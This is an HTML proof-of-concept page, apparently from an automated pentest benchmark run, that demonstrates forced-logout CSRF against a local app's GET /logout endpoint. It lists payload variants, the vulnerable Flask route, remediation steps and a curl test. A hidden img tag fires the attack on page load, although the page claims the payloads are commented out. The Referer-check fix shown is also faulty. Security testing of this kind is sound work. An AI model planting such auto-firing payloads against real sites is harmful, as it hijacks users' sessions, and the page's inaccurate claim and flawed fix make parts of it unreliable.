<!-- 
POC: HTML page demonstrating CSRF vulnerability on logout endpoint, showing how an attacker can force users to logout via GET requests without CSRF tokens
Target: ./repo
Created: 2025-11-10T18:35:28.850Z
Session: benchmark-XBEN-007-24-mhtgyyde

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-007-24-mhtgyyde/pocs/poc_csrf_logout_attack.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>CSRF Logout Vulnerability Demonstration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        h1 {
            color: #d32f2f;
        }
        .vulnerability {
            background-color: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }
        .code {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            padding: 10px;
            border-radius: 4px;
            font-family: monospace;
            overflow-x: auto;
            margin: 10px 0;
        }
        .attack-methods {
            margin: 20px 0;
        }
        .method {
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
        }
        .section-title {
            font-size: 1.2em;
            font-weight: bold;
            margin-top: 20px;
            color: #333;
        }
        /* Hidden CSRF attack payloads */
        .csrf-attack {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸ”´ CSRF Logout Vulnerability Demonstration</h1>
        
        <div class="vulnerability">
            <strong>Vulnerability Type:</strong> Cross-Site Request Forgery (CSRF)<br>
            <strong>Affected Endpoint:</strong> /logout<br>
            <strong>HTTP Method:</strong> GET<br>
            <strong>Severity:</strong> LOW (Forced Logout - Idempotent Operation)
        </div>

        <div class="section-title">Vulnerability Description</div>
        <p>The /logout endpoint at http://localhost:5003/logout accepts GET requests without requiring CSRF tokens or implementing any CSRF protection mechanisms.</p>
        
        <p>This allows an attacker to create a malicious webpage that, when visited by a logged-in user, will automatically trigger a logout request without the user's knowledge or consent.</p>

        <div class="section-title">How CSRF Logout Attack Works</div>
        <ol>
            <li>Attacker creates a malicious webpage</li>
            <li>Webpage contains hidden logout requests (image tags, links, iframes, etc.)</li>
            <li>Logged-in user visits the malicious page</li>
            <li>Browser automatically sends authenticated logout request</li>
            <li>User is logged out without their knowledge</li>
        </ol>

        <div class="section-title">Attack Methods</div>
        
        <div class="method">
            <strong>Method 1: Hidden Image Tag</strong>
            <div class="code">&lt;img src="http://localhost:5003/logout" style="display:none;" alt=""&gt;</div>
            <p>The browser will automatically load this image, sending an authenticated GET request to /logout</p>
        </div>

        <div class="method">
            <strong>Method 2: Hidden Link Tag</strong>
            <div class="code">&lt;link rel="stylesheet" href="http://localhost:5003/logout"&gt;</div>
            <p>The browser will attempt to load this as a stylesheet, sending the logout request</p>
        </div>

        <div class="method">
            <strong>Method 3: Script Tag</strong>
            <div class="code">&lt;script src="http://localhost:5003/logout"&gt;&lt;/script&gt;</div>
            <p>The browser will attempt to load and execute this as JavaScript</p>
        </div>

        <div class="method">
            <strong>Method 4: Hidden IFrame</strong>
            <div class="code">&lt;iframe src="http://localhost:5003/logout" style="display:none;"&gt;&lt;/iframe&gt;</div>
            <p>The browser will load this iframe, causing a logout</p>
        </div>

        <div class="method">
            <strong>Method 5: Fetch API (JavaScript)</strong>
            <div class="code">fetch('http://localhost:5003/logout', {credentials: 'include'});</div>
            <p>JavaScript can send a cross-origin GET request with credentials (requires CORS bypass)</p>
        </div>

        <div class="section-title">Proof of Concept Requirements</div>
        <ul>
            <li>âœ“ Target user must be logged into MedGuard (http://localhost:5003)</li>
            <li>âœ“ Target user visits a page containing the attack payload</li>
            <li>âœ“ Browser automatically sends authenticated request to /logout</li>
            <li>âœ“ No CSRF token is required</li>
            <li>âœ“ No Origin/Referer validation is performed</li>
        </ul>

        <div class="section-title">Why This Is Vulnerable</div>
        <div class="code">
@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))
        </div>
        <ul>
            <li>No methods=['POST'] specification - accepts all methods including GET</li>
            <li>No CSRF token validation</li>
            <li>No SameSite cookie flags</li>
            <li>No Origin/Referer header validation</li>
            <li>No request forgery protection</li>
        </ul>

        <div class="section-title">Impact</div>
        <ul>
            <li><strong>Primary:</strong> Forced logout (Denial of Service to user's session)</li>
            <li><strong>Secondary:</strong> Can be combined with phishing (logout + redirect to phishing page)</li>
            <li><strong>Workflow:</strong> Interrupts user workflow and causes frustration</li>
            <li><strong>Severity:</strong> LOW because logout is idempotent (no data modification)</li>
        </ul>

        <div class="section-title">Remediation</div>
        <ol>
            <li><strong>Change to POST-only:</strong>
                <div class="code">@app.route('/logout', methods=['POST'])</div>
            </li>
            <li><strong>Add CSRF Protection:</strong>
                <div class="code">@csrf_protect
@app.route('/logout', methods=['POST'])</div>
            </li>
            <li><strong>Set SameSite Cookie Flag:</strong>
                <div class="code">app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'</div>
            </li>
            <li><strong>Implement Referer Validation:</strong>
                <div class="code">if not request.referrer.startswith(request.host):
    abort(403)</div>
            </li>
        </ol>

        <div class="section-title">Testing Instructions</div>
        <ol>
            <li>Log into MedGuard at http://localhost:5003 as any user</li>
            <li>Send a GET request to http://localhost:5003/logout using curl:
                <div class="code">curl -i http://localhost:5003/logout</div>
            </li>
            <li>Observe that the request is accepted (HTTP 302 Redirect)</li>
            <li>Note the Set-Cookie header expiring the session</li>
            <li>Verify that you are logged out</li>
        </ol>

        <!-- HIDDEN CSRF ATTACK PAYLOADS FOR DEMONSTRATION -->
        <div class="csrf-attack">
            <!-- Method 1: Hidden Image Tag -->
            <img src="http://localhost:5003/logout" style="display:none;" alt="">
            
            <!-- Method 2: Hidden Script Tag -->
            <!-- <script src="http://localhost:5003/logout"></script> -->
            
            <!-- Method 3: Hidden IFrame -->
            <!-- <iframe src="http://localhost:5003/logout" style="display:none;"></iframe> -->
        </div>

        <div class="vulnerability" style="background-color: #d4edda; border-color: #c3e6cb; margin-top: 30px;">
            <strong style="color: #155724;">NOTE:</strong> This is a demonstration page for educational purposes. The hidden CSRF payloads above are commented out or hidden. In a real attack, these would be active and would force logout any logged-in user visiting this page.
        </div>
    </div>
</body>
</html>